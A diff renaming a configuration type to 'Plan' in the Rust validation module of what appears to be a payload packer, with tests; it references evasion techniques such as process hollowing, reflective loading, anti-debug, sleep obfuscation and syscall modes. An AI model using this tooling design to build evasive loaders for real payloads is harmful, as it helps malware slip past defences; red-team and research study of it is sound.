@@ -1,4 +1,4 @@
-//! Semantic validation of the already-deserialized configuration.
+//! Semantic validation of the already-deserialized plan.
 //!
 //! Unlike parsing (which validates structure and types), here we check
 //! business rules that cannot be expressed naturally with `serde`: empty
@@ -9,53 +9,53 @@ use crate::engine::syscalls::SyscallsConfig;
 use crate::error::{PackerError, Result};
 use crate::techniques::{category_of, Category, RuntimeStep};
 
-use super::schema::{Arch, Config, PayloadFormat, StubConfig};
+use super::schema::{Arch, PayloadFormat, Plan, StubPlan};
 
-/// Checks the business invariants of a [`Config`].
+/// Checks the business invariants of a [`Plan`].
 ///
 /// The schema version is already validated during `Deserialize`, so here we
 /// focus on semantic rules.
-pub fn validate(config: &Config) -> Result<()> {
-    if config.name.trim().is_empty() {
+pub fn validate(plan: &Plan) -> Result<()> {
+    if plan.name.trim().is_empty() {
         return Err(PackerError::Validation(
             "'name' must not be empty".to_string(),
         ));
     }
 
-    if config.build.payload.source.trim().is_empty() {
+    if plan.build.payload.source.trim().is_empty() {
         return Err(PackerError::Validation(
             "'build.payload.source' must not be empty".to_string(),
         ));
     }
 
-    if config.build.output.path.as_os_str().is_empty() {
+    if plan.build.output.path.as_os_str().is_empty() {
         return Err(PackerError::Validation(
             "'build.output.path' must not be empty".to_string(),
         ));
     }
 
-    validate_arch(config)?;
-    validate_payload_format(config)?;
-    validate_payload_sha256(config)?;
-    validate_sign(config)?;
-    validate_runtime(&config.runtime)?;
-    validate_conflicts(&config.runtime)?;
-    validate_sleep_obfuscation(&config.runtime)?;
-    validate_stub(&config.build.stub)?;
+    validate_arch(plan)?;
+    validate_payload_format(plan)?;
+    validate_payload_sha256(plan)?;
+    validate_sign(plan)?;
+    validate_runtime(&plan.runtime)?;
+    validate_conflicts(&plan.runtime)?;
+    validate_sleep_obfuscation(&plan.runtime)?;
+    validate_stub(&plan.build.stub)?;
 
     Ok(())
 }
 
 /// Non-fatal advisories produced by validation.
 ///
-/// These do not reject a config (unlike [`validate`]); the build prints them as
+/// These do not reject a plan (unlike [`validate`]); the build prints them as
 /// warnings. Today they cover a `bouncer` gate with no check declared (a no-op,
 /// almost certainly not intended) and the debug build, whose whole point is to
 /// trade evasion for observability and whose artifact is therefore never for
 /// delivery.
-pub fn advisories(config: &Config) -> Vec<String> {
+pub fn advisories(plan: &Plan) -> Vec<String> {
     let mut warnings = Vec::new();
-    for step in &config.runtime {
+    for step in &plan.runtime {
         if let RuntimeStep::Bouncer { params } = step {
             if params.is_noop() {
                 warnings.push(
@@ -67,14 +67,14 @@ pub fn advisories(config: &Config) -> Vec<String> {
         }
     }
 
-    if config.build.stub.debug {
+    if plan.build.stub.debug {
         warnings.push(
             "build.stub.debug is enabled: the artifact prints technique traces and is built \
              without symbol stripping, path trimming or optimization; it is a lab artifact and \
              must not be delivered"
                 .to_string(),
         );
-        if config
+        if plan
             .runtime
             .iter()
             .any(|step| matches!(step, RuntimeStep::AntiDebug { .. }))
@@ -94,7 +94,7 @@ pub fn advisories(config: &Config) -> Vec<String> {
 /// `build.stub` itself may be empty (builtin stub, default syscall mode,
 /// default obfuscation); an unknown `syscalls.mode`/`syscalls.resolver` or
 /// `strings.strategy` is a clear error.
-fn validate_stub(stub: &StubConfig) -> Result<()> {
+fn validate_stub(stub: &StubPlan) -> Result<()> {
     SyscallsConfig::from_yaml(stub.syscalls.as_ref())?;
     StringsConfig::from_yaml(stub.strings.as_ref())?;
     Ok(())
@@ -107,13 +107,13 @@ fn validate_stub(stub: &StubConfig) -> Result<()> {
 /// suspended process's image; a DLL has no process entry point to run and raw
 /// shellcode has no image at all). Shellcode and DLL payloads are run in-process
 /// by `reflective_loading`.
-fn validate_payload_format(config: &Config) -> Result<()> {
-    let payload = &config.build.payload;
+fn validate_payload_format(plan: &Plan) -> Result<()> {
+    let payload = &plan.build.payload;
 
     if let Some(export) = &payload.export {
         if payload.format != PayloadFormat::Dll {
             return Err(PackerError::Validation(format!(
-                "'build.payload.export' only applies to 'format: dll' (this config declares \
+                "'build.payload.export' only applies to 'format: dll' (this plan declares \
                  format: {})",
                 payload.format.label()
             )));
@@ -126,7 +126,7 @@ fn validate_payload_format(config: &Config) -> Result<()> {
     }
 
     if payload.format != PayloadFormat::Pe {
-        let execution = config
+        let execution = plan
             .runtime
             .iter()
             .find(|step| category_of(step.name()) == Some(Category::Execution));
@@ -146,8 +146,8 @@ fn validate_payload_format(config: &Config) -> Result<()> {
 ///
 /// Catching a malformed pin here gives a clear message instead of a confusing
 /// "payload mismatch" at build time.
-fn validate_payload_sha256(config: &Config) -> Result<()> {
-    let Some(hash) = config.build.payload.sha256.as_deref() else {
+fn validate_payload_sha256(plan: &Plan) -> Result<()> {
+    let Some(hash) = plan.build.payload.sha256.as_deref() else {
         return Ok(());
     };
     let hash = hash.trim();
@@ -164,8 +164,8 @@ fn validate_payload_sha256(config: &Config) -> Result<()> {
 /// Only the mode-specific requirements are checked here; locating `signtool`
 /// and the certificate happens at build time (so the error names what is
 /// actually missing on the machine).
-fn validate_sign(config: &Config) -> Result<()> {
-    let Some(sign) = &config.build.output.sign else {
+fn validate_sign(plan: &Plan) -> Result<()> {
+    let Some(sign) = &plan.build.output.sign else {
         return Ok(());
     };
     match sign.mode.as_str() {
@@ -205,11 +205,11 @@ fn validate_sign(config: &Config) -> Result<()> {
 ///
 /// `x86` is a recognized value (the enum documents it for completeness), but the
 /// stub is only generated for x64. Accepting it would silently emit an x64
-/// binary from a config that asked for x86, so it fails loudly instead.
+/// binary from a plan that asked for x86, so it fails loudly instead.
 /// Integrating x86 is more work than the enum value suggests: a second target, a
 /// 32-bit stub variant, and a per-architecture fragment for every technique.
-fn validate_arch(config: &Config) -> Result<()> {
-    if config.build.output.arch == Arch::X86 {
+fn validate_arch(plan: &Plan) -> Result<()> {
+    if plan.build.output.arch == Arch::X86 {
         return Err(PackerError::Validation(
             "build.output.arch: 'x86' is not integrated yet; the stub toolchain only targets \
              x86_64 today. Adding x86 means a 32-bit stub variant plus a per-architecture fragment \
@@ -326,7 +326,7 @@ fn validate_runtime(runtime: &[RuntimeStep]) -> Result<()> {
 mod tests {
     use super::*;
 
-    /// A full valid config without a runtime (runtime tests append their own).
+    /// A full valid plan without a runtime (runtime tests append their own).
     const NO_RUNTIME: &str = r#"
 schema: 4
 name: pipeline-test
@@ -343,7 +343,7 @@ build:
     trim_paths: all
 "#;
 
-    /// A full valid config with a single Execution technique, used by the
+    /// A full valid plan with a single Execution technique, used by the
     /// source/output regression tests.
     const VALID: &str = r#"
 schema: 4
@@ -396,18 +396,18 @@ runtime:
   - technique: reflective_loading
 "#;
 
-    fn parse(yaml: &str) -> Config {
+    fn parse(yaml: &str) -> Plan {
         serde_yml::from_str(yaml).expect("valid YAML")
     }
 
-    fn with_runtime(runtime_yaml: &str) -> Config {
+    fn with_runtime(runtime_yaml: &str) -> Plan {
         parse(&(NO_RUNTIME.to_string() + runtime_yaml))
     }
 
     #[test]
     fn rejects_zero_execution_techniques() {
-        let config = with_runtime(PREPARATION_YAML);
-        let err = validate(&config).expect_err("zero execution techniques must fail");
+        let plan = with_runtime(PREPARATION_YAML);
+        let err = validate(&plan).expect_err("zero execution techniques must fail");
         assert!(
             err.to_string()
                 .contains("Pipeline must declare exactly one Execution technique."),
@@ -417,8 +417,8 @@ runtime:
 
     #[test]
     fn rejects_two_execution_techniques() {
-        let config = with_runtime(TWO_EXECUTION_YAML);
-        let err = validate(&config).expect_err("two execution techniques must fail");
+        let plan = with_runtime(TWO_EXECUTION_YAML);
+        let err = validate(&plan).expect_err("two execution techniques must fail");
         let msg = err.to_string();
         assert!(
             msg.contains("Pipeline must declare exactly one Execution technique."),
@@ -430,8 +430,8 @@ runtime:
 
     #[test]
     fn rejects_preparation_after_execution() {
-        let config = with_runtime(PREP_AFTER_EXEC_YAML);
-        let err = validate(&config).expect_err("preparation after execution must fail");
+        let plan = with_runtime(PREP_AFTER_EXEC_YAML);
+        let err = validate(&plan).expect_err("preparation after execution must fail");
         let msg = err.to_string();
         assert!(
             msg.contains(
@@ -443,21 +443,21 @@ runtime:
 
     #[test]
     fn accepts_preparation_before_execution() {
-        let config = with_runtime(PREP_BEFORE_EXEC_YAML);
-        validate(&config).expect("preparation before execution must be valid");
+        let plan = with_runtime(PREP_BEFORE_EXEC_YAML);
+        validate(&plan).expect("preparation before execution must be valid");
     }
 
     #[test]
     fn accepts_single_execution() {
-        let config = with_runtime(EXECUTION_YAML);
-        validate(&config).expect("a single execution technique must be valid");
+        let plan = with_runtime(EXECUTION_YAML);
+        validate(&plan).expect("a single execution technique must be valid");
     }
 
     // --- payload formats ---
 
     /// Injects extra `build.payload` lines into [`NO_RUNTIME`], then appends a
     /// runtime fragment.
-    fn with_payload(payload_lines: &str, runtime_yaml: &str) -> Config {
+    fn with_payload(payload_lines: &str, runtime_yaml: &str) -> Plan {
         let yaml = NO_RUNTIME.replace(
             "    source: ./payload.exe\n",
             &format!("    source: ./payload.bin\n{payload_lines}"),
@@ -467,23 +467,23 @@ runtime:
 
     #[test]
     fn accepts_shellcode_with_reflective_loading() {
-        let config = with_payload("    format: shellcode\n", EXECUTION_YAML);
-        validate(&config).expect("shellcode + reflective_loading must be valid");
+        let plan = with_payload("    format: shellcode\n", EXECUTION_YAML);
+        validate(&plan).expect("shellcode + reflective_loading must be valid");
     }
 
     #[test]
     fn accepts_a_dll_with_an_export() {
-        let config = with_payload("    format: dll\n    export: Run\n", EXECUTION_YAML);
-        validate(&config).expect("dll + export + reflective_loading must be valid");
+        let plan = with_payload("    format: dll\n    export: Run\n", EXECUTION_YAML);
+        validate(&plan).expect("dll + export + reflective_loading must be valid");
     }
 
     #[test]
     fn rejects_shellcode_with_process_hollowing() {
-        let config = with_payload(
+        let plan = with_payload(
             "    format: shellcode\n",
             "runtime:\n  - technique: process_hollowing\n",
         );
-        let err = validate(&config).expect_err("hollowing can only run a PE today");
+        let err = validate(&plan).expect_err("hollowing can only run a PE today");
         let msg = err.to_string();
         assert!(msg.contains("process_hollowing"), "msg: {msg}");
         assert!(msg.contains("shellcode"), "msg: {msg}");
@@ -492,18 +492,18 @@ runtime:
 
     #[test]
     fn rejects_a_dll_with_process_hollowing() {
-        let config = with_payload(
+        let plan = with_payload(
             "    format: dll\n",
             "runtime:\n  - technique: process_hollowing\n",
         );
-        let err = validate(&config).expect_err("hollowing cannot run a DLL");
+        let err = validate(&plan).expect_err("hollowing cannot run a DLL");
         assert!(err.to_string().contains("process_hollowing"), "err: {err}");
     }
 
     #[test]
     fn rejects_an_export_without_the_dll_format() {
-        let config = with_payload("    export: Run\n", EXECUTION_YAML);
-        let err = validate(&config).expect_err("export only applies to dll");
+        let plan = with_payload("    export: Run\n", EXECUTION_YAML);
+        let err = validate(&plan).expect_err("export only applies to dll");
         let msg = err.to_string();
         assert!(msg.contains("build.payload.export"), "msg: {msg}");
         assert!(msg.contains("format: dll"), "msg: {msg}");
@@ -511,8 +511,8 @@ runtime:
 
     #[test]
     fn rejects_an_empty_dll_export() {
-        let config = with_payload("    format: dll\n    export: \"   \"\n", EXECUTION_YAML);
-        let err = validate(&config).expect_err("an empty export must fail");
+        let plan = with_payload("    format: dll\n    export: \"   \"\n", EXECUTION_YAML);
+        let err = validate(&plan).expect_err("an empty export must fail");
         assert!(err.to_string().contains("export"), "err: {err}");
     }
 
@@ -595,15 +595,15 @@ runtime:
 
     #[test]
     fn advises_on_a_noop_bouncer() {
-        let config = with_runtime(
+        let plan = with_runtime(
             r#"
 runtime:
   - technique: bouncer
   - technique: reflective_loading
 "#,
         );
-        validate(&config).expect("a no-op bouncer is valid, only advised against");
-        let warnings = advisories(&config);
+        validate(&plan).expect("a no-op bouncer is valid, only advised against");
+        let warnings = advisories(&plan);
         assert_eq!(warnings.len(), 1);
         assert!(warnings[0].contains("bouncer"), "unclear: {warnings:?}");
         assert!(warnings[0].contains("no-op"), "unclear: {warnings:?}");
@@ -611,7 +611,7 @@ runtime:
 
     #[test]
     fn no_advisory_when_bouncer_declares_a_check() {
-        let config = with_runtime(
+        let plan = with_runtime(
             r#"
 runtime:
   - technique: bouncer
@@ -620,7 +620,7 @@ runtime:
   - technique: reflective_loading
 "#,
         );
-        assert!(advisories(&config).is_empty());
+        assert!(advisories(&plan).is_empty());
     }
 
     #[test]
@@ -767,7 +767,7 @@ runtime:
     }
 
     /// `VALID` with `block` appended to the `output` mapping.
-    fn with_sign(block: &str) -> Config {
+    fn with_sign(block: &str) -> Plan {
         let yaml = VALID.replace(
             "    trim_paths: all\n",
             &format!("    trim_paths: all\n{block}"),
